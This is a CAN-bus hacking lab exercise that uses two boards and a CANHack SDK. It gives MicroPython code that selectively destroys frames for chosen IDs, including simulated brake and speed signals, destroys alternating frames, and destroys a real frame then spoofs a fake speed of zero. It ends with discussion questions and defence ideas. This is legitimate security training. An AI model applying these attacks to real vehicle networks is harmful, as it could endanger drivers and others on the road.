# Challenge 6: Targeted Frame Destruction
**Difficulty:** 🔴 Hard | **Time:** 40 min | **Boards:** 2

## 🎯 Objective
Selectively destroy **only specific CAN frames** while leaving all other bus traffic untouched. This is a surgical attack — like jamming only the brake ECU while steering and engine continue to work normally.

## 📖 Background
CANHack targets the arbitration ID configured with `set_frame()`. The SDK does not
provide a mask/range filter, so a range attack must configure and run one exact ID
at a time. This keeps the exercise honest about what the hardware API supports.

## 🔬 Exercise

### Setup
**Board B — simulates multiple ECUs sending different signals:**
```python
from rp2 import CAN, CANFrame, CANID
from utime import sleep_ms
from struct import pack

c = CAN()
i = 0

while True:
    # Simulate 4 different ECUs
    c.send_frame(CANFrame(CANID(0x100), data=pack('>H', i)))      # Engine RPM
    sleep_ms(25)
    c.send_frame(CANFrame(CANID(0x200), data=pack('>H', i*2)))    # Speed
    sleep_ms(25)
    c.send_frame(CANFrame(CANID(0x300), data=pack('>H', i*3)))    # Brake pressure
    sleep_ms(25)
    c.send_frame(CANFrame(CANID(0x400), data=pack('>H', i*4)))    # Steering angle
    sleep_ms(25)
    i = (i + 1) & 0xFFFF
```

### Part A: Destroy only the brake signal (0x300)
**Board A:**
```python
from rp2 import CAN, CANHack

c = CAN(tx_open_drain=True)
ch = CANHack()

# Target ONLY ID 0x300 (brake pressure)
ch.set_frame(can_id=0x300, data=bytes(2))
print("Destroying brake frames only...")
for i in range(20):
    timed_out = ch.error_attack(repeat=1)
    print(f"  Attack #{i+1} timed out: {timed_out}")
```

**Verify on a monitoring node:** IDs 0x100, 0x200, 0x400 should continue normally. Only 0x300 should be missing or corrupted.

### Part B: Target several exact IDs
CANHack has no range mask. To cover several IDs, configure and attack each one
explicitly. Have Board B transmit the IDs below in turn.

```python
from rp2 import CAN, CANHack

c = CAN(tx_open_drain=True)
ch = CANHack()

print("Destroying selected 0x2XX frames...")
for target_id in (0x200, 0x210, 0x2FF):
    ch.set_frame(can_id=target_id, data=bytes(8))
    timed_out = ch.error_attack(repeat=1, timeout=3_440_000)
    print(f"0x{target_id:03X}: timed out={timed_out}")
```

### Part C: Alternating destruction
Destroy frames in a pattern — kill every other frame from ID 0x200:
```python
from rp2 import CAN, CANHack
from utime import sleep_ms

c = CAN(tx_open_drain=True)
ch = CANHack()

ch.set_frame(can_id=0x200, data=bytes(2))
for i in range(20):
    if i % 2 == 0:
        ch.error_attack(repeat=1)
        print(f"  Frame #{i}: DESTROYED")
    else:
        sleep_ms(100)  # Let this one through
        print(f"  Frame #{i}: allowed")
```

**Questions:**
1. What's the real-world impact of destroying only brake messages?
2. Could a receiver detect that frames are being selectively destroyed?
3. How does this differ from a full bus DoS?
4. What if the attacker destroys the frame and then spoofs a replacement?

### Part D: Destroy + Replace (the ultimate attack)
Combine error injection with spoofing — destroy the real frame, then inject a fake one:
```python
from rp2 import CAN, CANHack
from struct import pack

c = CAN(tx_open_drain=True)
ch = CANHack()

# Step 1: Set up to destroy the real speed frame
ch.set_frame(can_id=0x200, data=bytes(2))
# Step 2: Destroy it
ch.error_attack(repeat=1)

# Step 3: Immediately send a fake replacement
fake_speed = pack('>H', 0)  # Fake speed = 0 (car thinks it's stopped)
ch.set_frame(can_id=0x200, data=fake_speed)
ch.spoof_frame(timeout=100000)

print("Destroyed real frame and injected fake!")
```

## 📝 What to Share
- Which frames you could selectively destroy
- Whether other traffic was affected
- The destroy+replace attack concept
- Defense ideas: message counters, alive signals, redundancy

## 🏆 Stretch
- [ ] Implement a continuous destroy+replace loop
- [ ] Can you detect the attack from the victim's error counters?
- [ ] Design a "message alive counter" defense mechanism
